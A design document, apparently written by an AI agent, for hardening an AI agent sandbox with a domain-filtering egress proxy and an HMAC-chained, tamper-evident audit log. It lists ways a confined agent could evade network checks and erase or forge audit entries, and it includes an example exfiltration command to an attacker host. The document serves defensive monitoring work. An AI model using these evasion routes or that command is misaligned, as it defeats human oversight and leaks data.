# AIRG P2 Hardening Design — Network Egress Proxy + Audit Tamper-Evidence

**Task:** W3 — Design (no implementation) the two P2 hardening items that cover what Landlock CANNOT do.
**Gate:** Independent of P1 completion; both items can be designed now and implemented in parallel with P3.
**Produced:** 2026-05-31 by general-purpose agent (Claude Sonnet 4.6).
**Design inputs (read in full):**
- `AGENT_CONTEXT.md §13.5 #1`, §13.4, §13.8 P2 roadmap.
- `docs/os-enforcement/ARCHITECTURE.md` (P2 scope, component inventory).
- `docs/os-enforcement/sandbox-policy-schema.md` (`os_sandbox.network_mode` / `allowed_tcp_ports`).
- `src/config.py` (network section normalization, `allowed_domains`, `blocked_domains`, `enforcement_mode`, `block_unknown_domains`).
- `src/policy_engine.py` (`network_policy_check` — the heuristic command-text evaluator).
- `src/audit.py` (`append_log_entry`, `build_log_entry` — plain JSON-lines append).
- `src/approvals.py` (`_approval_signing_key`, `_approval_hmac_key_path`, `_approval_grant_signature` — the HMAC key material).
- `src/backup.py` (`restore_manifest_signature`, `_approval_hmac_secret_bytes` — the Pass-2 manifest signing precedent).
- `src/reports.py` (`sync_from_log`, `_normalize_event`, `_event_key` — ingest pipeline that reads activity.log).

Cross-references:
- `AGENT_CONTEXT.md §13.4` (Topology A/B, why Landlock can't enforce append-only).
- `AGENT_CONTEXT.md §13.11` (spatial vs behavioral split; Landlock = port only, not domain).
- `docs/os-enforcement/sandbox-policy-schema.md §2.1.5–2.1.6` (network_mode / allowed_tcp_ports limits).

---

## Part A — Network Egress Filtering Proxy

### A.1 The Gap

**Layer 1 — Landlock/bwrap network rules (port-only, kernel-enforced):**
`os_sandbox.network_mode` and `allowed_tcp_ports` (per `sandbox-policy-schema.md §2.1.5–2.1.6`) provide
coarse TCP port-level confinement. A Landlock rule `--connect-tcp 443` allows the confined process
to open TCP connections to *any* IPv4/IPv6 address on port 443 — no domain, no IP-range, no hostname
restriction. UDP is not filterable by Landlock at all (no Landlock rule exists for UDP sockets).
This is not a shortcoming of the implementation; it is the documented maximum expressiveness of
Landlock ABI v4 (kernel 6.4/6.7) for network rules. See `AGENT_CONTEXT.md §13.5 #1` and §13.11.

**Layer 2 — AIRG MCP `network_policy_check` (domain-aware, heuristic, bypassable):**
`src/policy_engine.py::network_policy_check` evaluates `policy.network` (`allowed_domains`,
`blocked_domains`, `enforcement_mode`, `block_unknown_domains`) by:
1. Checking whether the command string contains a "network marker" from `network.commands`.
2. Parsing URL tokens from the command text to extract hostnames.
3. Comparing extracted hostnames against the domain allow/deny lists.

This approach has three fundamental limitations:
- **Heuristic:** only catches network activity whose domain appears in the command text as a URL token. A tool that resolves a hostname at runtime from config, or that uses a hardcoded IP literal, or that reads a destination from an env var, is invisible to the text parser.
- **Bypassed by native tools:** tools not routed through AIRG MCP (e.g., a subprocess spawned by the agent that uses `curl`, `wget`, raw Python `socket.connect`, etc.) never call `network_policy_check` at all. The policy_engine check runs only for commands that pass through AIRG `execute_command`.
- **SNI blind:** even for commands it sees, the policy_engine parses command *text* — it does not observe the actual TCP connection's SNI field or DNS resolution result.

**The resulting gap:** Landlock controls port access but not destination domain. `network_policy_check`
controls domains it can see in command text but is bypassable and text-heuristic. Neither layer
enforces domain-level egress at the connection layer for all traffic leaving the sandbox. An agent
that, for example, runs `curl https://exfil.attacker.io/data` via a native subprocess bypasses both
layers simultaneously (Landlock allows port 443; `network_policy_check` never sees the command).

---

### A.2 The Pattern — Forced Proxy Egress

The well-established defense-in-depth pattern for domain-level network filtering when the kernel
only provides port-level rules is:

> Sandbox blocks ALL outbound TCP except one local proxy port. The filtering proxy enforces the
> domain allow/deny policy at connection time for all outgoing traffic.

**How sandbox forces traffic through the proxy:**

1. **`HTTP_PROXY` / `HTTPS_PROXY` env injection:** The sandbox launcher (in `sandbox_launcher.py`
   `build_agent_env`) injects `HTTP_PROXY=http://127.0.0.1:<proxy_port>` and
   `HTTPS_PROXY=http://127.0.0.1:<proxy_port>` into the agent process env. Most HTTP clients
   (Python `urllib`, `requests`, `httpx`, Node `fetch`, `npm`, `pip`, `curl`, etc.) honor these
   variables automatically, routing all HTTP(S) traffic through the proxy.

2. **Landlock TCP port restriction:** The sandbox's `allowed_tcp_ports` is set to `[<proxy_port>]`
   (and loopback-only if using bwrap net namespace). Port 443 and 80 are NOT directly reachable
   from inside the sandbox. This forces *kernel-level*: any `connect(2)` to port 443 or 80 is
   denied; only a `connect(2)` to `127.0.0.1:<proxy_port>` succeeds.

3. **Proxy does the actual connection:** The proxy evaluates the target hostname against the
   domain allow/deny policy, allows or denies, and — for `CONNECT` tunnels — if allowed, opens the
   real TCP connection to the target on behalf of the confined agent.

The combination means:
- An agent that uses well-behaved HTTP clients gets transparent domain filtering.
- An agent that tries to make a raw TCP connect to port 443 (bypassing the proxy env) gets a
  kernel-level `ECONNREFUSED`.
- Only one port (the proxy port) needs to be open in the Landlock rules.

**Limitation (honest):** Tools that ignore proxy env vars — raw socket code that calls
`socket.connect(("api.example.com", 443))` without reading `HTTPS_PROXY`, or tools that use a
hardcoded proxy bypass list — will have their connections dropped by the kernel Landlock rule
(denied: port 443 not in `allowed_tcp_ports`), not by the proxy. The filtering proxy cannot see or
control traffic that never reaches it. This is acceptable: such traffic is blocked (fail-closed at
the kernel), not silently allowed. The proxy adds *domain-level visibility and allow/deny control*
for proxy-aware traffic; the kernel port rule remains the safety net for proxy-unaware traffic.

**DNS:** The agent's DNS lookups still originate from inside the sandbox. The proxy pattern does
not prevent DNS reconnaissance (querying arbitrary hostnames over UDP port 53 — Landlock has no
UDP rules). Mitigation options (in preference order):
1. Block DNS egress entirely and inject `/etc/hosts` entries for the allowed set at launch time
   (impractical for dynamic services).
2. Route DNS through a filtering DNS resolver (not recommended: increases complexity substantially).
3. Accept DNS leakage as out-of-scope for the defense-in-depth framing. The proxy blocks the
   *data connection*; DNS lookup for a blocked domain reveals intent but does not exfiltrate data.
   This is the recommended position for P2.

**IP literal handling:** An agent may attempt `socket.connect(("93.184.216.34", 443))` (IP literal,
bypassing DNS and proxy env). The kernel Landlock rule blocks port 443 directly — so this fails
at the kernel layer. If Landlock is unavailable and the sandbox is bwrap net-namespace only, the
proxy port block still applies (bwrap with `--unshare-net` and only the proxy port routed through
would block direct connections). IP literals do not circumvent the proxy/kernel combination.

---

### A.3 Proxy Options and Trade-offs

Three approaches to implement the filtering forward proxy:

| Option | Mechanism | Privacy | Visibility | Complexity | Recommendation |
|--------|-----------|---------|------------|------------|----------------|
| **SNI/Host-allowlist CONNECT proxy** | TCP `CONNECT` tunnel; evaluate allow/deny by SNI (TLS) or `Host:` (plain HTTP) header; no TLS interception | High — payload bytes never decrypted by proxy; proxy sees SNI only | Hostname + connect/deny events; no path, no payload | Low — ~150 LOC stdlib Python; no CA injection | **Recommended default** |
| **MITM proxy (TLS interception)** | Full TLS interception with a trusted CA certificate injected into the sandbox; proxy decrypts, inspects, re-encrypts | Low — payload is plaintext to proxy | Full — URL paths, request/response bodies, headers | High — CA generation, injection into trusted store, client compatibility, cert pinning breakage | Not recommended for P2; optional P3/P4 advanced mode |
| **Reuse existing tool (mitmproxy, Squid, tinyproxy)** | Depends on tool; mitmproxy can do MITM; tinyproxy is CONNECT-only; Squid is heavyweight | Depends | Depends | Med — external binary dep (same pip-packaging problem as landrun/bwrap) | Not recommended as default; operator may choose for advanced setups |

**Recommendation: SNI/Host-allowlist CONNECT proxy, built minimal in AIRG.**

Rationale:

1. **Privacy-preserving:** The proxy never decrypts TLS traffic. It evaluates the SNI field in the
   ClientHello (sent before any application data, visible to the proxy without decryption) and
   either allows the `CONNECT` tunnel or closes the connection. The agent's TLS session is
   end-to-end between the agent and the target server; the proxy is a pipe with a gate.

2. **No CA injection needed:** MITM proxies require generating a local CA, injecting it into the
   sandbox's trusted certificate store, and handling cert-pinning breakage for tools that embed
   their own CA bundle. This is operationally complex and invasive. The SNI/CONNECT approach
   requires none of this.

3. **Sufficient for the threat model:** The goal is preventing exfiltration to blocked domains and
   ensuring only allow-listed services are reachable. Knowing the SNI hostname (the TLS server-name
   extension the client sends in the clear) is exactly what is needed to evaluate the domain policy.
   Inspecting request bodies or URL paths is outside the stated goal and would require MITM.

4. **Minimal dependency:** A ~150 LOC stdlib Python `asyncio` proxy can be shipped inside AIRG
   with no external binary dependency. This is consistent with the "pip-installable by default"
   requirement that caused bwrap/landrun to need external packaging (see `AGENT_CONTEXT.md §13.5 #6`).

5. **Path/limitation is honest:** Inspecting paths and request bodies requires MITM. The MITM option
   can be added later as an explicit opt-in with appropriate warnings.

**SNI extraction for TLS CONNECT:** When the sandbox agent sends
`CONNECT api.example.com:443 HTTP/1.1`, the proxy sees the target hostname in the `CONNECT` request
itself — no SNI extraction needed at that point (the `CONNECT` target IS the hostname). After the
proxy allows the tunnel and the agent opens the TLS session, the proxy should also peek at the SNI
field in the ClientHello (first few bytes of the TLS record) to catch SNI-mismatch attacks where
a client sends `CONNECT allowed.com:443` but then sends a ClientHello with SNI for
`blocked.attacker.io`. This is an optional hardening step; the `CONNECT` hostname check is
sufficient for the initial implementation.

**HTTP (non-TLS):** For plain `http://` requests, the proxy sees the full `GET /path HTTP/1.1`
request with the `Host:` header, providing complete domain (and optionally path) visibility.
Plain-HTTP policy enforcement can additionally block specific paths if needed (future option).

---

### A.4 Policy Integration

**The proxy is driven by the EXISTING `network` policy section.** No new policy section is
introduced. The proxy is an enforcement mechanism for policy that already exists in
`policy.network`. This is the critical design invariant.

The relevant fields from `src/config.py` (`_validate_and_normalize_policy`):

```python
network = policy["network"]
network["enforcement_mode"]    # "off" | "monitor" | "enforce"
network["allowed_domains"]     # list[str] — domain allowlist (e.g. ["api.openai.com", "pypi.org"])
network["blocked_domains"]     # list[str] — domain denylist
network["block_unknown_domains"]  # bool — if True, deny all not in allowed_domains
```

**Proxy behavior per `enforcement_mode`:**

| `enforcement_mode` | Proxy behavior |
|-------------------|----------------|
| `"off"` | Proxy is not started. `os_sandbox.allowed_tcp_ports` must include the real target ports (80, 443) to allow direct egress. Domain filtering is absent (existing behavior today). |
| `"monitor"` | Proxy starts and evaluates domain allow/deny rules, but ALLOWS all connections regardless of result. Logs every connection attempt with the evaluated allow/deny verdict and the matched rule (or "unknown domain"). Traffic is not blocked. This matches the existing `network_policy_check` monitor semantics exactly. |
| `"enforce"` | Proxy starts and BLOCKS any connection not matching the allow policy. Specifically: (1) if `block_unknown_domains=True`, block any domain not in `allowed_domains`; (2) always block domains in `blocked_domains`. On block, proxy closes the tunnel and logs the event to `activity.log` via `append_log_entry` with `policy_decision: "blocked"`, `decision_tier: "network_proxy"`. |

**Proxy startup:** When `os_sandbox.mode` is `"enforce"` or `"monitor"` and
`network.enforcement_mode` is not `"off"`, the `airg-run` launcher starts the proxy as a subprocess
(or embedded asyncio coroutine in the AIRG server process, outside the sandbox) before establishing
the sandbox wall. The proxy bind address is `127.0.0.1:<proxy_port>` (loopback only; not
reachable from outside the machine).

**Proxy port:** The proxy port is a new configuration field at `os_sandbox.network_proxy_port`
(integer, default `0` = auto-assign from ephemeral range, which the launcher resolves to a concrete
port before injecting `HTTPS_PROXY` and configuring Landlock rules). The launcher always knows the
concrete port; it is injected into the sandbox env and Landlock rules at launch time. Operators can
set a fixed port if needed.

**`os_sandbox.network_mode` interaction:**

| `os_sandbox.network_mode` | Proxy interaction |
|--------------------------|-------------------|
| `"none"` | Incompatible with proxy (no outbound TCP allowed). If `network.enforcement_mode != "off"` and `network_mode == "none"`, AIRG should warn and either auto-upgrade to `"proxy"` or fail with a clear error. |
| `"loopback_only"` | Compatible. Proxy listens on loopback; sandbox allows loopback-only TCP; agent reaches proxy; proxy exits the sandbox boundary to the real network. This is the correct value for the proxy topology. |
| `"unrestricted"` | Compatible but weaker. Proxy operates as a monitoring/enforcement layer, but the sandbox does not enforce that ALL outbound TCP goes through the proxy (an agent that bypasses proxy env still gets through). Not recommended for `"enforce"` mode. |

A new `network_mode` value `"proxy"` may be added to the `os_sandbox.network_mode` enum in the
schema (see §A.5) to explicitly codify the proxy topology. This is cleaner than overloading
`"loopback_only"` and avoids misconfiguration.

**`blocked_domains` takes precedence over `allowed_domains`:** The proxy applies the same
precedence as `network_policy_check` in `policy_engine.py`: if a domain matches `blocked_domains`,
it is blocked even if it also appears in `allowed_domains`. If `block_unknown_domains=False` and
the domain is not in `blocked_domains`, it is allowed (permissive default, consistent with current
MCP behavior).

**Fail-closed (proxy-down in enforce mode):** If the proxy process exits unexpectedly while the
sandbox is running in `enforce` mode, the sandbox has `allowed_tcp_ports = [proxy_port]` — and the
proxy port is now closed. New `connect(2)` calls from the agent to the proxy port will get
`ECONNREFUSED`. Existing established connections are unaffected until they close. This is the
correct fail-closed behavior: proxy down = no new connections through. No configuration needed;
it is a natural consequence of the port-restriction + proxy topology. AIRG should monitor the proxy
process and log a structured `ERROR` event if it exits unexpectedly, with the suggestion to restart.

**The `network_policy_check` in `policy_engine.py` remains active and complementary:**
The proxy enforces at the connection layer; `network_policy_check` enforces at the command-text
layer (for commands routed through AIRG MCP tools). Both run. This provides defense-in-depth:
a blocked domain that appears in command text is blocked early at the MCP layer (before the command
even executes); a blocked domain that is only visible at connection time is blocked at the proxy layer.

---

### A.5 Schema Addition: `os_sandbox.network_proxy`

A new sub-object under `os_sandbox` to configure the proxy. This keeps proxy configuration
alongside the OS sandbox spatial rules that it composes with, while the domain allow/deny policy
stays in `policy.network` (no duplication).

```json
"os_sandbox": {
  ...existing fields...,
  "network_proxy": {
    "_comment": "Filtering CONNECT proxy for domain-level egress control. Driven by policy.network allow/deny lists. Only active when os_sandbox.mode != 'off' and network.enforcement_mode != 'off'.",
    "enabled": false,
    "port": 0,
    "sni_check": true,
    "log_allowed_connections": false
  }
}
```

| Field | Type | Default | Meaning |
|-------|------|---------|---------|
| `enabled` | bool | `false` | Whether to start the proxy. When `false`, no proxy is started and direct TCP egress is determined by `network_mode` / `allowed_tcp_ports` only. |
| `port` | int (0–65535) | `0` | Proxy listen port. `0` = auto-assign. The resolved port is injected into env and Landlock rules at launch time. |
| `sni_check` | bool | `true` | Whether to peek at the TLS ClientHello SNI field after `CONNECT` tunnel is established to detect SNI-mismatch attacks. `false` = rely on `CONNECT` target hostname only (simpler, slightly less secure). |
| `log_allowed_connections` | bool | `false` | Whether to emit an `activity.log` entry for each allowed connection (in addition to blocked ones). `false` by default to avoid log flooding in high-traffic agents; set `true` for audit-heavy deployments. |

**Normalization rule (add to `_validate_and_normalize_policy`):**

```python
os_sandbox = policy["os_sandbox"]  # already normalized above
proxy = os_sandbox.get("network_proxy")
if proxy is None:
    proxy = {}
if not isinstance(proxy, dict):
    raise ValueError("os_sandbox.network_proxy must be an object")
os_sandbox["network_proxy"] = proxy
proxy.setdefault("enabled", False)
if not isinstance(proxy["enabled"], bool):
    raise ValueError("os_sandbox.network_proxy.enabled must be boolean")
proxy.setdefault("port", 0)
try:
    port_int = int(proxy["port"])
except (TypeError, ValueError):
    raise ValueError("os_sandbox.network_proxy.port must be an integer")
if not (0 <= port_int <= 65535):
    raise ValueError("os_sandbox.network_proxy.port must be 0–65535")
proxy.setdefault("sni_check", True)
proxy.setdefault("log_allowed_connections", False)
```

---

### A.6 Codebase Location and Phased Plan

**New module: `src/network_proxy.py`**

A self-contained asyncio-based CONNECT proxy module. Key functions:

```python
async def run_proxy(
    *,
    host: str = "127.0.0.1",
    port: int,                    # resolved from config (0 = auto-assigned before call)
    allowed_domains: list[str],   # from policy.network.allowed_domains
    blocked_domains: list[str],   # from policy.network.blocked_domains
    block_unknown: bool,          # from policy.network.block_unknown_domains
    enforcement_mode: str,        # "monitor" | "enforce"  (caller already filtered "off")
    sni_check: bool,
    log_allowed_connections: bool,
) -> None:
    """Start the filtering CONNECT proxy. Runs until cancelled."""
    ...

def resolve_proxy_port(config_port: int) -> int:
    """
    If config_port == 0, bind to OS-assigned ephemeral port and return the real port.
    If config_port != 0, return config_port (operator-specified).
    """
    ...
```

**Integration touch-points:**

| File | Change |
|------|--------|
| `src/config.py` | Add `os_sandbox.network_proxy` sub-object normalization (§A.5). |
| `src/sandbox_launcher.py` | In `establish_and_launch()`: when `os_sandbox.network_proxy.enabled` is `True` and mode != "off", call `resolve_proxy_port()`, start the proxy task/subprocess, inject `HTTP_PROXY` / `HTTPS_PROXY` env, add proxy port to `allowed_tcp_ports` for Landlock/bwrap rules. |
| `src/airg_cli.py` | In `main_run()`: start the proxy (if enabled) before spawning the agent; monitor its health. |
| `src/network_proxy.py` | NEW — the filtering proxy implementation (~150 LOC asyncio). |
| `policy.json` | Add `os_sandbox.network_proxy` block with safe defaults (`enabled: false`). |
| `src/airg_cli.py` `_policy_template` | Add `network_proxy` sub-object to the `os_sandbox` template block. |
| `tests/test_helpers.py` | Add `network_proxy` defaults to `DEFAULT_TEST_POLICY["os_sandbox"]`. |
| `tests/test_network_proxy.py` | NEW — proxy logic tests (domain allow/deny, SNI check, monitor vs enforce, fail-closed). |
| `docs/os-enforcement/sandbox-policy-schema.md` | Append `network_proxy` sub-object spec. |

**Phased delivery:**

- **P2.A.1** — `network_proxy.py` module with CONNECT-only proxy (no SNI peek), driven by `policy.network` fields, monitor+enforce mode parity, `activity.log` events via `append_log_entry`. Test coverage. No launcher wiring yet.
- **P2.A.2** — Launcher wiring: `sandbox_launcher.py` starts proxy before agent, injects env vars, passes resolved port to Landlock/bwrap rules. `os_sandbox.network_proxy.port=0` auto-assignment.
- **P2.A.3** — SNI peek (TLS ClientHello parsing, ~50 LOC to read the first record and extract SNI). Controlled by `sni_check` field. Optional; can ship after P2.A.2.
- **P2.A.4** — GUI: proxy status card in the OS Sandbox panel; add `network_proxy.enabled` toggle to the Settings > Policy UI (follows the same pattern as other tri-state controls).

---

## Part B — Tamper-Evident Audit Log

### B.1 The Gap

**Current state (`src/audit.py`):**
`append_log_entry(entry: dict)` opens `activity.log` in append mode (`"a"`) and writes
`json.dumps(entry) + "\n"`. The log is plain newline-delimited JSON with no integrity protection.

**Why Landlock cannot solve this:**
Landlock's filesystem rules provide `LANDLOCK_ACCESS_FS_WRITE_FILE` and
`LANDLOCK_ACCESS_FS_READ_FILE`, but they have no `O_APPEND`-only granularity. A process with
`WRITE_FILE` permission on a file can open it with `O_RDWR` and seek to the beginning, overwriting
or truncating. There is no kernel mechanism in Landlock to enforce append-only semantics on a file.
(`AGENT_CONTEXT.md §13.4` documents this explicitly.)

**The threat:**
In Topology B (AIRG inside the sandbox), an agent-spawned subprocess inherits the sandbox and has
write access to the filesystem paths the sandbox allows. If `activity.log` is reachable from inside
the sandbox (as it would be in Topology B without explicit externalization), the agent could:
- Truncate the log to erase evidence of blocked operations.
- Append fabricated entries to pollute the audit record.
- Rewrite individual entries to change `policy_decision: "blocked"` to `"allowed"`.
- Delete the log entirely.

**In Topology A** (AIRG outside the sandbox — the recommended path, `AGENT_CONTEXT.md §13.4`):
`activity.log` lives in the AIRG state directory outside the sandbox, kernel-unreachable from the
confined agent. However:
- The design does not permanently require Topology A. If an operator uses Topology B as an interim
  (§13.4 B is "acceptable only as an interim"), audit integrity must not depend solely on topology.
- Even in Topology A, `activity.log` is written by the AIRG server process. A compromised AIRG
  server (outside-the-sandbox but potentially running in a shared environment) could tamper with
  logs between events.
- The cryptographic chain provides a defense-in-depth guarantee regardless of topology choice.

**Goal:** Make tampering *detectable*, not *preventable*. An audit system that can reliably
detect after-the-fact whether any entry was deleted, modified, reordered, or truncated is
significantly stronger than a plain log even if it cannot prevent tampering in real time.

---

### B.2 The Integrity Scheme — HMAC Chain

**Design: per-entry HMAC chain with a running hash, keyed by the approval HMAC key.**

This directly mirrors the `restore_manifest_signature` precedent in `src/backup.py`, which uses
`_approval_hmac_secret_bytes()` to sign manifest entries. The audit chain extends that pattern
from individual-entry signing to a sequential chain where each entry depends on all previous entries.

#### B.2.1 Key Material

**Reuse `approvals.db.hmac.key`** — the same key loaded by `_approval_signing_key()` in
`src/approvals.py` (path: `approvals.db.hmac.key` by default, overridable via
`AIRG_APPROVAL_HMAC_KEY_PATH` / `AIRG_APPROVAL_HMAC_SECRET`).

Rationale:
- The key already exists, is already generated and managed, and already has the correct permissions
  model (0600, outside the workspace, warned if inside workspace or world-accessible).
- The `backup.py::_approval_hmac_secret_bytes()` and `approvals.py::_approval_signing_key()` both
  resolve the same underlying key. The audit chain signing reuses one of these (preferred:
  `_approval_signing_key()` from `approvals.py` to get the cache and security-warning logic).
- No new key, no new key-management surface, no new operator onboarding step.

**Key protection (threat model):** The HMAC chain provides tamper-EVIDENCE only if the key is
inaccessible to the attacker. If the same key is reachable, an attacker with write access to
`activity.log` could re-compute the HMAC chain over modified entries and produce a valid-looking
forged log. Therefore:
- The key MUST live outside the sandbox (Topology A ensures this by kernel enforcement).
- The key MUST be unreadable to the agent process (`approvals.py` already warns if the key path
  is inside the workspace).
- In Topology B deployments, the key must be explicitly externalized (operator responsibility,
  logged as a warning if the key is inside the workspace).

See §B.4 for full threat model.

#### B.2.2 Entry Canonicalization

Before computing the HMAC, each log entry is canonicalized to a deterministic byte string. The
existing `json.dumps(entry)` call in `append_log_entry` is NOT deterministic (key ordering is
insertion-order in Python dicts, which varies). We need canonical JSON.

**Canonical form:** `json.dumps(entry, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")`

This is exactly the pattern used in `backup.py::restore_manifest_signature`:
```python
payload = json.dumps(
    {"source": source, "backup": backup, "type": item_type, "sha256": sha},
    sort_keys=True,
    separators=(",", ":"),
).encode("utf-8")
```

The audit chain uses the same pattern, applied to the full entry dict.

#### B.2.3 Chain Structure

Each log entry is extended with two new fields:

```json
{
  "timestamp": "...",
  "source": "...",
  ...existing fields...,
  "_chain_seq": 42,
  "_chain_hmac": "a3f7...hex..."
}
```

| Field | Type | Meaning |
|-------|------|---------|
| `_chain_seq` | int | Monotonically increasing sequence number, starting at 0 for the genesis entry. Enables truncation detection (a gap in sequence numbers is immediately visible) and reordering detection. |
| `_chain_hmac` | str (hex) | HMAC-SHA256 of `prev_hmac_hex || canonical(entry_without_chain_fields)` keyed by the approval HMAC key. See §B.2.4. |

**Fields excluded from HMAC computation:** `_chain_hmac` itself (circular). `_chain_seq` IS
included in the computation (otherwise seq tampering is undetectable).

#### B.2.4 HMAC Computation

```
prev_hmac  := _chain_hmac of the previous entry
              (or GENESIS_SENTINEL for the first entry — see §B.2.5)
canonical  := json.dumps(
                  {k: v for k, v in entry.items() if k != "_chain_hmac"},
                  sort_keys=True, separators=(",",":"), ensure_ascii=False
              ).encode("utf-8")
message    := prev_hmac.encode("ascii") + b"||" + canonical
hmac_value := hmac.new(signing_key, message, hashlib.sha256).hexdigest()
```

The `||` separator is a fixed ASCII byte sequence that is not a valid JSON character in this
context. The `prev_hmac.encode("ascii")` is a 64-character lowercase hex string. The concatenation
`prev_hmac || canonical` means any modification to any previous entry (which changes its HMAC,
which cascades through all subsequent `prev_hmac` fields) renders all downstream HMACs invalid.

#### B.2.5 Chain Genesis

The genesis entry (sequence 0) uses a fixed sentinel as the "previous HMAC":

```python
GENESIS_SENTINEL = "airg:audit:chain:genesis:v1"
```

This sentinel is a well-known constant embedded in the codebase. It is not secret; it is a
domain-specific constant that distinguishes the genesis from a chained entry, making forgery of
the genesis position detectable (an attacker inserting a fake entry at position 0 would need to
produce a valid HMAC over the sentinel + forged entry, which requires the key).

**Detecting truncation from the front:** Because the genesis sentinel is well-known, an attacker
who deletes the first N entries and re-numbers from 0 would need to re-chain from the new entry 0
with the genesis sentinel, and each subsequent HMAC would need to be recomputed. This requires the
HMAC key. Without the key, the re-numbered log will fail verification at position 0 because the
`_chain_hmac` of the "new entry 0" will not match
`HMAC(key, genesis_sentinel || canonical(new_entry_0))`.

#### B.2.6 Tamper Detection Summary

| Attack | How it is detected |
|--------|--------------------|
| **Modify entry N** | HMAC of entry N no longer matches `HMAC(key, prev_hmac_{N-1} || canonical(entry_N))`. First broken link reported at N. |
| **Delete entry N (middle)** | Sequence number gap: verifier expects N after N-1, finds N+1. Reports gap at seq N. |
| **Delete from the end** | Verifier checks the "expected next sequence" via the last known `_chain_seq`; a log that is shorter than expected (comparing against a trusted checkpoint or the last known seq before rotation) is flagged as truncated. Note: without a trusted checkpoint, end-truncation is only detectable if the verifier knows how many entries to expect. See §B.3.4 for the checkpoint recommendation. |
| **Append forged entry** | HMAC of the forged entry does not chain correctly from the real last entry (requires key). Reports broken link at the forged position. |
| **Reorder entries M, N (swap)** | HMAC of the entry at the new position M no longer matches its predecessor's HMAC. First broken link reported. |
| **Replace N entries with forged N entries (re-chain)** | Requires the HMAC key. Without the key, any re-chaining produces invalid HMACs. With the key, re-chaining is undetectable — see §B.4 threat model. |
| **Truncate from the front (delete entries 0..K)** | Entry at new position 0 has a `_chain_hmac` that does not match `HMAC(key, genesis_sentinel || canonical(entry))`. Reported as broken genesis link. |

---

### B.3 Verification

#### B.3.1 Verify Command

A new subcommand added to `airg-doctor` (or as a standalone `airg audit-verify` flag):

```
airg doctor --verify-audit-log [--log-path PATH] [--checkpoint PATH]
```

Or equivalently, as a new `airg-verify-audit` entry point in `pyproject.toml [project.scripts]`.

**Algorithm:**

```python
def verify_chain(log_path, hmac_key, checkpoint=None):
    prev_hmac = GENESIS_SENTINEL
    expected_seq = 0
    errors = []
    for lineno, line in enumerate(open(log_path), start=1):
        entry = json.loads(line)
        seq = entry.get("_chain_seq")
        stored_hmac = entry.get("_chain_hmac")
        if seq is None or stored_hmac is None:
            # Entry predates chain (legacy entry); skip or flag depending on policy.
            # Recommended: warn that legacy entries are present, continue.
            continue
        if seq != expected_seq:
            errors.append(f"Line {lineno}: sequence gap — expected {expected_seq}, got {seq}")
            expected_seq = seq + 1
            prev_hmac = stored_hmac  # continue from here to find more errors
            continue
        # Recompute
        entry_for_hmac = {k: v for k, v in entry.items() if k != "_chain_hmac"}
        canonical = json.dumps(entry_for_hmac, sort_keys=True,
                               separators=(",", ":"), ensure_ascii=False).encode("utf-8")
        message = prev_hmac.encode("ascii") + b"||" + canonical
        expected_hmac = hmac.new(hmac_key, message, hashlib.sha256).hexdigest()
        if not hmac.compare_digest(stored_hmac, expected_hmac):
            errors.append(f"Line {lineno} (seq {seq}): HMAC mismatch — chain broken here")
        prev_hmac = stored_hmac
        expected_seq = seq + 1

    if errors:
        return False, errors
    return True, []
```

The verifier reports the FIRST broken link (and continues to find subsequent breaks) rather than
stopping at the first error, so a partial tamper is fully characterized.

#### B.3.2 Integration with `airg-doctor`

Add to `main_doctor()` in `src/airg_cli.py`:

```python
def _doctor_audit_chain_check(issues, warnings):
    """Check that the audit log chain is intact."""
    log_path = pathlib.Path(LOG_PATH)
    if not log_path.exists():
        return  # no log yet; not an error
    try:
        key = _approval_signing_key()
    except Exception as exc:
        warnings.append(f"Audit chain: cannot load HMAC key — chain unverifiable: {exc}")
        return
    ok, errors = verify_chain(log_path, key)
    if not ok:
        for err in errors[:5]:   # cap output to avoid flooding
            issues.append(f"Audit chain: {err}")
        if len(errors) > 5:
            issues.append(f"Audit chain: ... and {len(errors) - 5} more errors")
    else:
        print("[ok] audit log chain intact")
```

#### B.3.3 Performance

**Per-entry HMAC cost:** `hmac.new(key, message, hashlib.sha256).hexdigest()` on a modern CPU
processes ~500 MB/s. A typical log entry is ~500 bytes canonicalized. The HMAC computation for one
entry takes approximately **1 microsecond**. For a deployment logging 100 events per second (heavy
load), the HMAC overhead is 100 µs/second — completely negligible relative to file I/O latency
(typically 50–200 µs per `fsync` or OS write buffer flush).

**Chain state in memory:** The running `prev_hmac` (64 bytes) and `expected_seq` (int) are
maintained in a module-level `_audit_chain_state` singleton in `audit.py`. This state is loaded
at first `append_log_entry` call by reading the last line of `activity.log` (if it exists and has
`_chain_fields`) or initializing to genesis. The in-memory state is cheap and avoids re-reading
the log on every append.

**Verification cost:** Walking a 100,000-entry log takes approximately 100 ms (100k × ~1 µs HMAC
+ JSON parse time). This is acceptable for a `doctor` check that runs on demand.

#### B.3.4 Rotation / Segmentation

**`activity.log` rotation:** When `activity.log` is rotated (e.g., by logrotate or by AIRG's own
size-based rotation), the new segment starts a new chain from the genesis sentinel with `_chain_seq = 0`.
This is intentional: the chain is per-segment. An attacker cannot delete an entire segment without
the absence being noticed externally (if segments are expected on a schedule or by size), but within
a segment, the chain provides full integrity.

**Checkpoint recommendation:** To detect end-truncation across rotation boundaries, AIRG should
write a **checkpoint record** to a separate, more protected location (e.g., a row in `reports.db`
or `approvals.db`) at regular intervals (every N entries, or on rotation). The checkpoint records
the last `_chain_seq` and `_chain_hmac` seen. The verifier compares the live log against the last
checkpoint to detect if entries were deleted from the end since the checkpoint was written.

Checkpoint storage location: `reports.db` (already outside the workspace, already using SQLite).
Add a `audit_chain_checkpoints` table:

```sql
CREATE TABLE IF NOT EXISTS audit_chain_checkpoints (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  checkpoint_at TEXT NOT NULL,   -- ISO timestamp
  last_seq INTEGER NOT NULL,
  last_hmac TEXT NOT NULL,
  log_segment TEXT NOT NULL      -- which log file/rotation segment this applies to
);
```

Checkpoints are written by `append_log_entry` every `AUDIT_CHAIN_CHECKPOINT_INTERVAL` entries
(e.g., 100; configurable via `audit.chain_checkpoint_interval` in policy.json). The checkpoint
write goes to `reports.db`, which is outside the sandbox and protected separately.

#### B.3.5 Key Unavailable — Failure Mode

When the HMAC key cannot be loaded (e.g., key file deleted, permission error, key path is
inaccessible), `append_log_entry` has two options:

| Option | Behavior | Recommendation |
|--------|----------|---------------|
| **Fail-closed** | Refuse to write the log entry; raise an exception that propagates to the caller. | Too disruptive: a logging failure would block tool execution. |
| **Degraded mode** | Write the log entry WITHOUT `_chain_hmac` / `_chain_seq` fields; emit a separate `_chain_error` field explaining why signing was skipped; log a warning event. | **Recommended.** |

